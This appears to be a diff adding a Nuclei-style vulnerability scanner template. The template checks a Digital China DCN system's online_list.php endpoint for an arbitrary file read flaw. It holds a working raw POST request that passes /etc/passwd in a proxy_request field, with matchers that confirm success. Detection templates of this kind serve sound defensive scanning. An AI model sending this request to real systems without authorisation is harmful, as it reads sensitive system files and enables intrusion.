@@ -1,0 +1,26 @@
+id: dcn-online-list-lfi
+
+info:
+  name: DCN online_list.php - LFI
+  author: qwtd
+  severity: high
+  description: |
+    神州数码DCN系统接口online_list.php存在任意文件读取漏洞
+  tags: 神州数码DCN
+
+http:
+  - raw:
+      - |
+        POST /function/auth/user/online_list.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        proxy_request=/etc/passwd
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
